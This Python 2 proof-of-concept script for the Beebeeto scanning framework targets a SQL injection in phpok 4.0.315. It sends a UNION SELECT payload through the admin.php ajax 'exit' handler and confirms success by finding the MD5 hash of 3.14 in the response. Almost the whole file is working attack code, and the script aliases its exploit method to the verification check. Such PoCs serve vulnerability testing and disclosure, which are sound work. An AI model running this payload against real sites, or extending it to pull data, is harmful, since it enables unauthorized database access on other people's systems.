#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0101',
            'name': 'phpok 4.0.315 /framework/ajax/admin_opt.php SQL注入漏洞 POC',
            'author': 'xuemoz',
            'create_date': '2014-10-22',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'phpok',
            'vul_version': ['4.0.315'],
            'type': 'SQL Injection',
            'tag': ['phpok漏洞', 'SQL注入漏洞', '/framework/ajax/admin_opt.php', 'php'],
            'desc': 'N/A',
            'references': ['http://loudong.360.cn/vul/info/id/3514/',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        verify_url = args['options']['target'] + ('/admin.php?c=ajax&f=exit&filename=opt&group_id=1 union select '
                                                  '3,1,0,md5(3.14),1,6 %23&identifier=1')
        req = urllib2.Request(verify_url)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(req).read()
        if "4beed3b9c4a886067de0e3a094246f78" in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())